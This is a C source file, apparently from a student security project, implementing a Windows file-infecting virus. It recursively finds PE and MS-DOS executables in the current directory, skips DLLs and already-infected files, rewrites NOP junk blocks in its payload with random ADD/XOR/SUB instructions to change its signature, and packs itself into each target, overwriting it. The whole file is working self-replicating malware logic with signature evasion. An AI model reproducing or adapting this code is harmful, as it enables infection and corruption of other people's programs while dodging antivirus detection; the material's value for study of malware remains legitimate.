/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   infection.c                                        :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: jguyet <jguyet@student.42.fr>              +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2017/03/13 12:11:43 by jguyet            #+#    #+#             */
/*   Updated: 2017/03/13 12:15:42 by jguyet           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "infection.h"

int seed = 0;
int next_n = 0;

int get_seed(void)
{
	next_n += 2;
	return (seed + next_n);
}

void		writeinstruction(char *executable_content, unsigned reg) {

	const unsigned char asm_instructions[] = { ADD,AND,XOR,OR,SBB,SUB,0 };

	executable_content[0] = asm_instructions[get_seed() % (sizeof(asm_instructions) - 1)];
	executable_content[1] = 0xC0 + get_seed() % 8 * 8 + reg;
	executable_content[2] = asm_instructions[get_seed() % (sizeof(asm_instructions) - 1)];
	executable_content[3] = 0xC0 + get_seed() % 8 * 8 + reg;
	executable_content[4] = asm_instructions[get_seed() % (sizeof(asm_instructions) - 1)];
	executable_content[5] = 0xC0 + get_seed() % 8 * 8 + reg;
}

int			generate_new_signature(char **new_executableP, char *executable_content, int executable_content_size) {
	char *new_exe = ft_strnew(executable_content_size);

	memcpy(new_exe, executable_content, executable_content_size);

	for (int i = 4096; i < executable_content_size - (ASM_JUNK_LEN + 2); i++)
	{
		unsigned char push_instruction = new_exe[i + 0];
		unsigned char pop_instruction = new_exe[i + (ASM_JUNK_LEN + 1)];
		unsigned char reg = push_instruction - PUSH;

		if (push_instruction != PUSH || pop_instruction != POP)
			continue ;
		int nNop = 0;
		int block = 0;
		for (int _i = 0; _i < ASM_JUNK_LEN; _i++) {
			unsigned char instruction = new_exe[(i + 1) + _i];
			if (instruction == NOP)
				nNop++;
		}
		if (nNop > 0) {//4 NOP instruction or 8
			memset(new_exe + i + 1, NOP, ASM_JUNK_LEN);
			printf("offset(0x%x) nNop : %d\n", (i - 4096) + 4194304, nNop);
			writeinstruction(new_exe + i + 1, 0);
		}
	}
	*new_executableP = new_exe;
	return (executable_content_size);
}

/*
** Infect windows Portable executable
*/
void		infect_pe_file(char *argv, IMAGE_DOS *img, char *infection_content, int infection_size) {
	if (is_pe_x64(img->pe_header) == false)
		return ;
	if (img->pe_header->FileHeader.Characteristics & IMAGE_FILE_DLL)
		return ;
	if (find_pattern(img->buffer, img->len) != -1)//is file infected
	{
		printf("File \"%s\" is already infected (%d)\n", img->name, img->pe_header->FileHeader.Characteristics);
		return ;
	}
	char *new_infection = NULL;
	int new_infection_size = generate_new_signature(&new_infection, infection_content, infection_size);

	img->new_buffer_len = pack_executables(&img->new_buffer, new_infection, new_infection_size, img->buffer, img->len);
	printf("File \"%s\" infected (%d)\n", img->name, img->pe_header->FileHeader.Characteristics);
	windows_file_put_contents_size(img->name, img->new_buffer, img->new_buffer_len);
}

/*
** Infect MS-DOS executable
*/
void		infect_dos_file(char *argv, IMAGE_DOS *img, char *infection_content, int infection_size) {
	if (img->len < sizeof(struct _IMAGE_DOS_HEADER) + sizeof(IMAGE_NT_HEADERS)) {
		return ;
	}
	img->dos_header = (IMAGE_DOS_HEADER*)img->buffer;
	img->pe_header = (IMAGE_NT_HEADERS*)(img->buffer + img->dos_header->e_lfanew);
	if (is_pe_signature(img->pe_header))
	{
		infect_pe_file(argv, img, infection_content, infection_size);
	}
	free(img);
}

/*
** Infect PE or MS-DOS windows files
*/
void		infect_file(char *argv, char *file_path, char *infection_content, int infection_size) {
	char	*file = NULL;
	size_t	size = windows_file_get_contents_size(&file, file_path);
	int		file_type = get_windows_binary_type(file);

	seed = (int)size;
	if (file_type == IS_DOS_BINARY_TYPE) {
		IMAGE_DOS *img = (struct _IMAGE_DOS*)malloc(sizeof(struct _IMAGE_DOS));

		if (img == NULL)
			return ;
		img->buffer = file;
		img->len = size;
		img->name = file_path;
		infect_dos_file(argv, img, infection_content, infection_size);
	}
}

void		replace_sequence_to_infection(int sequence, char *infection_content, int infection_size) {
	char patt[] = { 0x57, 0x61, 0x72, 0x20, 0x76, 0x65, 0x72, 0x73, 0x69, 0x6f, 0x6e };//War version
	for (int i = 0; i < infection_size - sizeof(patt); i++) {
		if (memcmp(infection_content + i, patt, sizeof(patt)) == 0) {
			int offset = i + sizeof(patt) + 40;
			char *ptr = infection_content + offset;

			char *ss = ft_strnew(3 * 3);
			asprintf(&ss, "%d%d%d", sequence, sequence, sequence);
			memcpy(infection_content + offset, ss, 3 * 3);
			free(ss);
			break ;
		}
	}
}

/*
** Infect with recursivity all Windows binary files (PE, MS-DOS)
*/
void		infect(char *argv, char *infection_content, int infection_size, int sequence) {
	char **files = NULL;
	char *prog_bname = file_base_name(argv);

	files = get_files_types(files, ".", is_windows_binary_file);
	for (int i = 0; files[i]; i++) {
		char *file_bname = file_base_name(files[i]);
		if (strcmp(file_bname, prog_bname) == 0) {
			free(file_bname);
			continue ;
		}
		seed = 0;
		next_n = 0;
		sequence++;
		if (sequence >= 1000)
			sequence = 100;
		replace_sequence_to_infection(sequence, infection_content, infection_size);
		infect_file(argv, files[i], infection_content, infection_size);
		free(file_bname);
	}
	free_array(files);
	free(prog_bname);
}
